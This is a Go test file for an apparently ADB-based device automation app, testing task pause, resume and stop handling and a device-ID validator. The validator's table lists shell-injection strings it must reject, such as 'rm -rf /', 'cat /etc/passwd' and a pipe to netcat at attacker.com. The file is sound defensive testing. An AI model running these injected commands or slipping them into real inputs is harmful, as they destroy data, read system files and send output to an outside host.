package main

import (
	"context"
	"testing"
	"time"
)

// ========================================
// Task Pause/Resume Tests
// ========================================

func TestCleanupTaskPause(t *testing.T) {
	deviceId := "test-device-1"

	// Simulate pause state
	taskPauseMu.Lock()
	taskPauseSignal[deviceId] = make(chan struct{})
	taskIsPaused[deviceId] = true
	taskPauseMu.Unlock()

	// Verify pause state exists
	taskPauseMu.Lock()
	_, signalExists := taskPauseSignal[deviceId]
	_, pausedExists := taskIsPaused[deviceId]
	taskPauseMu.Unlock()

	if !signalExists || !pausedExists {
		t.Fatal("Expected pause state to exist before cleanup")
	}

	// Clean up
	cleanupTaskPause(deviceId)

	// Verify cleanup
	taskPauseMu.Lock()
	_, signalExists = taskPauseSignal[deviceId]
	_, pausedExists = taskIsPaused[deviceId]
	taskPauseMu.Unlock()

	if signalExists {
		t.Error("Expected taskPauseSignal to be deleted after cleanup")
	}
	if pausedExists {
		t.Error("Expected taskIsPaused to be deleted after cleanup")
	}
}

func TestCleanupTaskPauseUnblocksWaitingGoroutine(t *testing.T) {
	deviceId := "test-device-2"

	// Create pause state
	taskPauseMu.Lock()
	ch := make(chan struct{})
	taskPauseSignal[deviceId] = ch
	taskIsPaused[deviceId] = true
	taskPauseMu.Unlock()

	// Start a goroutine that waits on the channel
	done := make(chan bool)
	go func() {
		<-ch // This should block until cleanup closes the channel
		done <- true
	}()

	// Give the goroutine time to start waiting
	time.Sleep(10 * time.Millisecond)

	// Clean up should close the channel and unblock the goroutine
	cleanupTaskPause(deviceId)

	// Wait for the goroutine to complete (with timeout)
	select {
	case <-done:
		// Success - goroutine was unblocked
	case <-time.After(100 * time.Millisecond):
		t.Error("Cleanup did not unblock waiting goroutine")
	}
}

func TestCleanupTaskPauseIdempotent(t *testing.T) {
	deviceId := "test-device-3"

	// Create pause state
	taskPauseMu.Lock()
	taskPauseSignal[deviceId] = make(chan struct{})
	taskIsPaused[deviceId] = true
	taskPauseMu.Unlock()

	// First cleanup
	cleanupTaskPause(deviceId)

	// Second cleanup should not panic (idempotent)
	cleanupTaskPause(deviceId)

	// Third cleanup should also be safe
	cleanupTaskPause(deviceId)
}

func TestCleanupTaskPauseNoState(t *testing.T) {
	deviceId := "test-device-nonexistent"

	// Cleanup on non-existent device should not panic
	cleanupTaskPause(deviceId)
}

func TestCleanupTaskPausePartialState(t *testing.T) {
	deviceId := "test-device-4"

	// Only set isPaused without signal channel
	taskPauseMu.Lock()
	taskIsPaused[deviceId] = true
	taskPauseMu.Unlock()

	// Cleanup should handle partial state
	cleanupTaskPause(deviceId)

	taskPauseMu.Lock()
	_, pausedExists := taskIsPaused[deviceId]
	taskPauseMu.Unlock()

	if pausedExists {
		t.Error("Expected taskIsPaused to be deleted even without signal channel")
	}
}

// ========================================
// DeviceID Validation Tests
// ========================================

func TestValidateDeviceID(t *testing.T) {
	tests := []struct {
		name      string
		deviceID  string
		wantError bool
	}{
		// Valid device IDs
		{"USB serial", "1234567890ABCDEF", false},
		{"Emulator", "emulator-5554", false},
		{"Wireless IP:port", "192.168.1.100:5555", false},
		{"mDNS device", "adb-XXXXX._adb-tls-connect._tcp.", false},
		{"Simple alphanumeric", "device123", false},
		{"With underscore", "my_device_1", false},
		{"With dots", "device.local", false},
		{"IPv6 style", "::1:5555", false},

		// Invalid device IDs
		{"Empty", "", true},
		{"Too long", string(make([]byte, 300)), true},
		{"Shell injection semicolon", "device; rm -rf /", true},
		{"Shell injection &&", "device && cat /etc/passwd", true},
		{"Shell injection ||", "device || echo hacked", true},
		{"Shell injection pipe", "device | nc attacker.com 1234", true},
		{"Shell injection backtick", "device`whoami`", true},
		{"Shell injection $", "device$(id)", true},
		{"Shell injection parenthesis", "device()", true},
		{"Shell injection braces", "device{}", true},
		{"Shell injection redirect", "device > /tmp/out", true},
		{"Shell injection single quote", "device'test'", true},
		{"Shell injection double quote", "device\"test\"", true},
		{"Shell injection backslash", "device\\ntest", true},
		{"Newline", "device\ntest", true},
		{"Tab", "device\ttest", true},
		{"Space only", "   ", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDeviceID(tt.deviceID)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateDeviceID(%q) error = %v, wantError = %v", tt.deviceID, err, tt.wantError)
			}
		})
	}
}

func TestMustValidateDeviceID(t *testing.T) {
	// Initialize logger to prevent nil pointer
	_ = InitLogger(DefaultLogConfig())

	// Valid device ID should return true
	if !MustValidateDeviceID("valid-device-123") {
		t.Error("Expected valid device ID to return true")
	}

	// Invalid device ID should return false
	if MustValidateDeviceID("device; rm -rf /") {
		t.Error("Expected invalid device ID to return false")
	}

	// Empty device ID should return false
	if MustValidateDeviceID("") {
		t.Error("Expected empty device ID to return false")
	}
}

// ========================================
// Pause/Resume/Stop Integration Tests
// ========================================

func TestPauseResumeFlow(t *testing.T) {
	deviceId := "test-pause-resume"

	// Clean up any existing state
	cleanupTaskPause(deviceId)

	// Simulate a running task with context
	_, cancel := context.WithCancel(context.Background())
	defer cancel()

	activeTaskMu.Lock()
	activeTaskCancel[deviceId] = cancel
	activeTaskMu.Unlock()
	defer func() {
		activeTaskMu.Lock()
		delete(activeTaskCancel, deviceId)
		activeTaskMu.Unlock()
	}()

	// Create a mock App
	app := &App{mcpMode: true} // mcpMode=true to skip Wails events

	// Test 1: Pause
	app.PauseTask(deviceId)

	taskPauseMu.Lock()
	isPaused := taskIsPaused[deviceId]
	_, hasSignal := taskPauseSignal[deviceId]
	taskPauseMu.Unlock()

	if !isPaused {
		t.Error("Expected task to be paused")
	}
	if !hasSignal {
		t.Error("Expected pause signal channel to exist")
	}

	// Test 2: Resume
	app.ResumeTask(deviceId)

	taskPauseMu.Lock()
	isPaused = taskIsPaused[deviceId]
	_, hasSignal = taskPauseSignal[deviceId]
	taskPauseMu.Unlock()

	if isPaused {
		t.Error("Expected task to be resumed (not paused)")
	}
	if hasSignal {
		t.Error("Expected pause signal channel to be deleted")
	}
}

func TestStopWhilePaused(t *testing.T) {
	deviceId := "test-stop-while-paused"

	// Clean up any existing state
	cleanupTaskPause(deviceId)

	// Simulate a running task with context
	ctx, cancel := context.WithCancel(context.Background())

	activeTaskMu.Lock()
	activeTaskCancel[deviceId] = cancel
	activeTaskMu.Unlock()

	// Create a mock App
	app := &App{mcpMode: true}

	// Pause the task
	app.PauseTask(deviceId)

	// Verify paused
	taskPauseMu.Lock()
	isPaused := taskIsPaused[deviceId]
	taskPauseMu.Unlock()
	if !isPaused {
		t.Fatal("Expected task to be paused")
	}

	// Start a goroutine that simulates checkPauseWithContext
	checkResult := make(chan bool, 1)
	go func() {
		result := app.checkPauseWithContext(ctx, deviceId)
		checkResult <- result
	}()

	// Give the goroutine time to start waiting
	time.Sleep(50 * time.Millisecond)

	// Stop the task (should cancel context and resume)
	app.StopTask(deviceId)

	// Wait for checkPauseWithContext to return
	select {
	case result := <-checkResult:
		if !result {
			t.Error("Expected checkPauseWithContext to return true (cancelled), got false")
		}
	case <-time.After(1 * time.Second):
		t.Fatal("checkPauseWithContext did not return within timeout")
	}

	// Verify context is cancelled
	select {
	case <-ctx.Done():
		// Good, context was cancelled
	default:
		t.Error("Expected context to be cancelled")
	}
}

func TestCheckPauseWithContextCancellation(t *testing.T) {
	deviceId := "test-check-pause-cancel"

	// Clean up any existing state
	cleanupTaskPause(deviceId)

	// Create a context that will be cancelled
	ctx, cancel := context.WithCancel(context.Background())

	// Create a mock App
	app := &App{mcpMode: true}

	// Pause the task
	app.PauseTask(deviceId)
	defer cleanupTaskPause(deviceId)

	// Start checkPauseWithContext in a goroutine
	checkResult := make(chan bool, 1)
	go func() {
		result := app.checkPauseWithContext(ctx, deviceId)
		checkResult <- result
	}()

	// Give the goroutine time to start waiting
	time.Sleep(50 * time.Millisecond)

	// Cancel the context (simulating StopTouchPlayback)
	cancel()

	// checkPauseWithContext should detect cancellation and return true
	select {
	case result := <-checkResult:
		if !result {
			t.Error("Expected checkPauseWithContext to return true when context is cancelled")
		}
	case <-time.After(1 * time.Second):
		t.Fatal("checkPauseWithContext did not respond to context cancellation")
	}
}

func TestCheckPauseWithContextResumeAndCancel(t *testing.T) {
	deviceId := "test-resume-and-cancel"

	// Clean up any existing state
	cleanupTaskPause(deviceId)

	// Create a context
	ctx, cancel := context.WithCancel(context.Background())

	// Create a mock App
	app := &App{mcpMode: true}

	// Pause the task
	app.PauseTask(deviceId)
	defer cleanupTaskPause(deviceId)

	// Start checkPauseWithContext in a goroutine
	checkResult := make(chan bool, 1)
	go func() {
		result := app.checkPauseWithContext(ctx, deviceId)
		checkResult <- result
	}()

	// Give the goroutine time to start waiting
	time.Sleep(50 * time.Millisecond)

	// Cancel context first, then resume (this is what StopTask does)
	cancel()
	time.Sleep(10 * time.Millisecond) // Small delay to ensure cancel is processed
	app.ResumeTask(deviceId)

	// checkPauseWithContext should return true (cancelled)
	select {
	case result := <-checkResult:
		if !result {
			t.Error("Expected checkPauseWithContext to return true when context cancelled before resume")
		}
	case <-time.After(1 * time.Second):
		t.Fatal("checkPauseWithContext did not return within timeout")
	}
}
